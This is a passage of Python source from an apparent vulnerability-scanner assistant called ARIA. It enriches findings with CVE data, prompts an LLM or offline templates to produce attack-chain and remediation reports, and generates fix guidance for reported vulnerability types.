        for f in findings:
            raw = f.get("cve_ids", [])
            if isinstance(raw, list):
                for c in raw:
                    m = re.match(r"CVE-\d{4}-\d+", str(c).strip(), re.IGNORECASE)
                    if m:
                        cve_ids.add(m.group().upper())
            elif isinstance(raw, str):
                for m in re.finditer(r"CVE-\d{4}-\d+", raw, re.IGNORECASE):
                    cve_ids.add(m.group().upper())
        enriched: dict = {}
        for cve_id in list(cve_ids)[:10]:
            data = self.lookup_cve(cve_id)
            if data:
                enriched[cve_id] = {
                    "cvss_score":  data.get("cvss_score"),
                    "severity":    (data.get("severity") or "").upper(),
                    "description": data.get("description", ""),
                    "nvd_url":     f"https://nvd.nist.gov/vuln/detail/{cve_id}",
                }
        return enriched

    # ── Findings analysis ─────────────────────────────────────────────────────

    def analyze_findings(self, findings: list, target: str, scan_type: str = "web") -> dict:
        counts = {s: sum(1 for f in findings if (f.get("severity") or "info").lower() == s)
                  for s in ("critical", "high", "medium", "low", "info")}

        mitre_mappings = self._build_mitre_mappings(findings)
        nvd_enriched   = self._build_nvd_enriched(findings)
        compliance     = self._build_compliance(counts)

        if not findings:
            return {
                "aria_mode":      "online" if self.ai_active else "offline",
                "provider":       self.provider,
                "attack_chain":   "## No Findings\n\nScan completed — zero vulnerabilities detected.",
                "mitre_mappings": [], "remediation_md": None,
                "remediation_steps": [], "compliance": compliance, "nvd_enriched": {},
            }

        sys_prompt = (
            "You are ARIA, a senior penetration tester. Be technical, precise, and action-oriented. "
            "Format responses as professional Markdown with code blocks."
        )
        payload = json.dumps(findings[:15], indent=2, ensure_ascii=False)[:4000]

        attack_chain   = None
        remediation_md = None

        if self.ai_active:
            attack_chain = self._ai_call(
                f"Target: {target} | Scan: {scan_type}\nFindings ({len(findings)} total):\n{payload}\n\n"
                "Write a realistic step-by-step attack chain narrative: how would an attacker chain "
                "these vulnerabilities? Include entry points, lateral movement, and impact.",
                system=sys_prompt,
            )
            remediation_md = self._ai_call(
                f"Based on these {len(findings)} security findings:\n{payload}\n\n"
                "Write prioritized remediation steps with specific code examples. "
                "Group by: ## Priority 1 — CRITICAL, ## Priority 2 — HIGH, etc.",
                system=sys_prompt,
            )

        if not attack_chain:
            attack_chain = self._offline_attack_chain(findings, target, scan_type, counts)
        if not remediation_md:
            remediation_md = self._offline_remediation(findings, counts)

        return {
            "aria_mode":         "online" if self.ai_active else "offline",
            "provider":          self.provider,
            "attack_chain":      attack_chain,
            "mitre_mappings":    mitre_mappings,
            "remediation_md":    remediation_md,
            "remediation_steps": [],
            "compliance":        compliance,
            "nvd_enriched":      nvd_enriched,
        }

    def generate_fix(self, vuln_type: str, context: str = "") -> str:
        """Generate a specific code fix for a vulnerability type."""
        if self.ai_active:
            system = _SYSTEM_PROMPT
            prompt = (
                f"Generate a concrete, production-ready code fix for: **{vuln_type}**\n\n"
                f"Context:\n{context[:1000]}\n\n"
                "Provide:\n1. The vulnerable code pattern (before)\n2. The fixed code (after)\n"
                "3. Why the fix works\n4. Any additional hardening steps"
            )
            result = self._ai_call(prompt, system=system)
            if result:
                return result

        # Offline KB lookup
        key = vuln_type.lower().strip()
        for kb_key, kb in _KB.items():
            if kb_key in key or key in kb_key:
                return (
                    f"## Fix for {vuln_type}\n\n"
                    f"**CWE:** {kb.get('cwe','N/A')} | **OWASP:** {kb.get('owasp','N/A')}\n\n"
                    f"### Remediation\n{kb.get('fix','See documentation.')}\n\n"
                    f"**Tools to verify fix:** {kb.get('tools','Manual review')}"
                )
        return (
            f"## Fix for {vuln_type}\n\n"
            "No specific offline fix available for this vulnerability type. "
            "Refer to OWASP guidelines and the specific CVE/CWE documentation.\n\n"
            "Enable GEMINI_API_KEY or OLLAMA_URL for AI-powered fix generation."
        )

    def _offline_attack_chain(self, findings: list, target: str, scan_type: str, counts: dict) -> str:
        risk = next((s for s in ("critical","high","medium","low") if counts.get(s,0)>0), "info")
        now  = datetime.now().strftime("%Y-%m-%d %H:%M UTC")
        top  = sorted(findings, key=lambda f: {"critical":0,"high":1,"medium":2,"low":3,"info":4}.get(
            (f.get("severity") or "info").lower(), 5))

        lines = [
            f"# Attack Chain Analysis — {target}",
            f"**Generated:** {now} | **Scan:** {scan_type.upper()} | **Highest Risk:** {risk.upper()}",
            "",
            "## Attack Surface",
            f"Assessment identified **{len(findings)}** security issue(s): "
            f"{counts.get('critical',0)} Critical · {counts.get('high',0)} High · "
            f"{counts.get('medium',0)} Medium · {counts.get('low',0)} Low",
            "", "## Likely Attack Scenario", "",
        ]
        check_all = " ".join((f.get("check","") + " " + (f.get("title",""))).lower() for f in findings)
        for i, f in enumerate(top[:5], 1):
            sev   = (f.get("severity") or "info").lower()
            title = f.get("title") or f.get("check") or "Unknown Finding"
            desc  = (f.get("description") or "")[:150]
            tactic = next(
                (mtr["tactic"] for kw, mtr in _MITRE_MAP.items()
                 if kw in (f.get("check","") + " " + title + " " + desc).lower()),
                "Initial Access",
            )
            lines.append(f"**Step {i} [{sev.upper()}] — {tactic}:** {title}")
            if desc:
                lines.append(f"> {desc}")
            lines.append("")

        impacts = []
        if any(k in check_all for k in ("sql","inject","rce","command")):
            impacts.append("- **Data Breach** — Database exfiltration or destruction")
        if any(k in check_all for k in ("auth","credential","hardcoded","bypass")):
            impacts.append("- **Account Takeover** — Unauthorized access via compromised credentials")
        if any(k in check_all for k in ("xss","csrf","session")):
            impacts.append("- **Session Hijacking** — Theft of authenticated user sessions")
        if any(k in check_all for k in ("ssrf","path","lfi","traversal")):
            impacts.append("- **Information Disclosure** — Access to sensitive internal resources")
        if not impacts:
            impacts.append("- **Security Degradation** — Multiple misconfigurations compound overall risk")

        lines += ["## Impact Assessment", ""] + impacts + ["",
            "*Enable GEMINI_API_KEY or OLLAMA_URL for AI-powered personalized analysis.*"]
        return "\n".join(lines)

    def _offline_remediation(self, findings: list, counts: dict) -> str:
        total_w = sum(_SEV_WEIGHT.get((f.get("severity") or "info").lower(), 0) for f in findings)
        score   = max(0, 100 - min(total_w * 2, 95))
        now     = datetime.now().strftime("%Y-%m-%d %H:%M UTC")
        risk    = next((s for s in ("critical","high","medium","low") if counts.get(s,0)>0), "info")

        seen, fixes = set(), []
        for sev in ("critical","high","medium","low"):
            for f in findings:
                if (f.get("severity") or "info").lower() != sev:
                    continue
                title = f.get("title", f.get("check", "Unknown"))[:60]
                if title in seen:
                    continue
                seen.add(title)
                fix_text = "Review finding details and apply the indicated remediation."
                for kb_key, kb in _KB.items():
                    if kb_key in title.lower():
                        fix_text = kb["fix"][:300]
                        break
                fixes.append(f"**{len(fixes)+1}. [{sev.upper()}] {title}**\n```\n{fix_text}\n```")
                if len(fixes) >= 5:
                    break
            if len(fixes) >= 5:
                break

        score_label = (
            "Excellent" if score >= 90 else "Good — fix HIGH" if score >= 70
            else "Significant gaps" if score >= 50 else "Critical posture"
        )
        lines = [
            f"# Remediation Report — {now}",
            f"**Risk Level:** {risk.upper()} | **Security Score:** {score}/100 — {score_label}",
            f"**Findings:** {len(findings)} total — "
            f"{counts.get('critical',0)} Critical · {counts.get('high',0)} High · "
            f"{counts.get('medium',0)} Medium · {counts.get('low',0)} Low",
            "", "---", "", "## Prioritized Remediation Steps", "",
        ] + fixes + [
            "",
            "*Ask ARIA about any specific vulnerability for detailed attack scenarios and fix examples.*",
        ]
        return "\n".join(lines)


# ── Singleton (thread-safe for Gunicorn multi-worker) ─────────────────────────
_aria: Optional[ARIA] = None
_aria_lock = threading.Lock()


def get_aria() -> ARIA:
    global _aria
    if _aria is None:
        with _aria_lock:
            if _aria is None:
                _aria = ARIA()
    return _aria
